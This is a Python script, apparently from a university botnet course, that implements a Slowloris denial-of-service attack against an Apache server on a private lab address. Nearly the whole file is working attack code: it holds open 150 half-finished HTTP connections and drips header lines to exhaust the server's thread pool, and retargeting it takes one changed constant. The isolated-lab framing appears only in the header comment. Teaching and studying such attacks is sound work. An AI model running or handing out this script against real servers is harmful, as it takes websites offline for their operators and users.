"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Slowloris HTTP Exhaustion Attack
 Environment: ISOLATED VM LAB ONLY
              Target: Apache on 192.168.100.20:80
====================================================

Slowloris opens many TCP connections and drips one byte
of HTTP headers every few seconds, never completing the
request. Apache's fixed thread pool exhausts itself
holding these "legitimate-looking" connections open.

Key teaching point: Nginx (event-driven) is immune.
Apache (thread-per-connection) is not.
"""

import socket
import time
import random
import threading
import logging

logging.basicConfig(level=logging.INFO, format="[Slowloris %(asctime)s] %(message)s",
                    datefmt="%H:%M:%S")

TARGET_IP   = "192.168.100.20"
TARGET_PORT = 80
NUM_SOCKETS = 150        # number of half-open connections to maintain
KEEP_ALIVE_INTERVAL = 10 # seconds between header drips


def create_socket(target_ip, target_port):
    """Open a TCP connection and send a partial HTTP GET header."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((target_ip, target_port))
        # Send a valid-looking but incomplete HTTP request header
        s.send(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target_ip}\r\n".encode("utf-8"))
        s.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n")
        s.send(b"Accept-language: en-US,en;q=0.5\r\n")
        # Deliberately DO NOT send the final \r\n that would complete the headers
        return s
    except socket.error:
        s.close()
        return None


def slowloris(target_ip=TARGET_IP, target_port=TARGET_PORT,
              num_sockets=NUM_SOCKETS, duration=60):
    """
    Maintain `num_sockets` half-open connections against target.
    Every `KEEP_ALIVE_INTERVAL` seconds, send a single extra header
    line to each socket to prevent timeout, never completing the request.
    """
    logging.info(f"Starting Slowloris -> {target_ip}:{target_port}")
    logging.info(f"Target sockets: {num_sockets}  |  Duration: {duration}s")

    sockets = []

    # Phase 1: open initial socket pool
    logging.info("Opening socket pool...")
    for _ in range(num_sockets):
        s = create_socket(target_ip, target_port)
        if s:
            sockets.append(s)

    logging.info(f"Opened {len(sockets)} sockets. Entering keep-alive loop.")

    end_time = time.time() + duration
    while time.time() < end_time:
        logging.info(f"Active sockets: {len(sockets)} / {num_sockets}")

        # Send a keep-alive header drip to each socket
        dead = []
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except socket.error:
                dead.append(s)

        # Remove dead sockets
        for s in dead:
            sockets.remove(s)
            s.close()

        # Refill to maintain the target count
        refill_count = num_sockets - len(sockets)
        for _ in range(refill_count):
            s = create_socket(target_ip, target_port)
            if s:
                sockets.append(s)

        time.sleep(KEEP_ALIVE_INTERVAL)

    # Cleanup
    for s in sockets:
        s.close()
    logging.info("Slowloris complete. All sockets closed.")


if __name__ == "__main__":
    slowloris(duration=60)
